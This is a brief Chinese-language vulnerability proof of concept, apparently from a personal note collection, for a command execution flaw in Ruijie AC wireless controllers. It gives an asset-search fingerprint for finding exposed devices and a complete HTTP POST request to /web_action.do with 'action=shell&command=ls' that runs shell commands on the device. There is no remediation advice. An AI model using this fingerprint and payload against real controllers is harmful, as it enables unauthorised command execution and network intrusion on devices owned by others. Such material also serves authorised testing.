# 锐捷AC无线控制器存在命令执行漏洞

**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">锐捷AC无线控制器存在命令执行漏洞，攻击者可通过该漏洞执行任意命令</font>  
**二、影响版本**

锐捷AC无线控制器

**三、资产测绘**

```plain
web.body="简网络，玩智分，无线移动体验 "
```

●登录![1711997786378-edcef547-10cd-420c-832e-a770238eb3f2.png](./img/SkGRDmmGc2Tiryjr/1711997786378-edcef547-10cd-420c-832e-a770238eb3f2-083457.png)

![1711997819097-a4244fdc-1bef-41ee-b4ff-ed704db1c612.png](./img/SkGRDmmGc2Tiryjr/1711997819097-a4244fdc-1bef-41ee-b4ff-ed704db1c612-391171.png)



![1711997764050-f8b07f3f-7a50-4784-b518-dde60cd3f693.png](./img/SkGRDmmGc2Tiryjr/1711997764050-f8b07f3f-7a50-4784-b518-dde60cd3f693-905629.png)

**四、漏洞复现**

```plain
POST /web_action.do HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

action=shell&command=ls
```

![1711997844450-ea706a57-d350-4ae3-9d94-65913aa37d36.png](./img/SkGRDmmGc2Tiryjr/1711997844450-ea706a57-d350-4ae3-9d94-65913aa37d36-776431.png)



> 更新: 2024-06-24 11:42:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fivwdfbv0bacamon>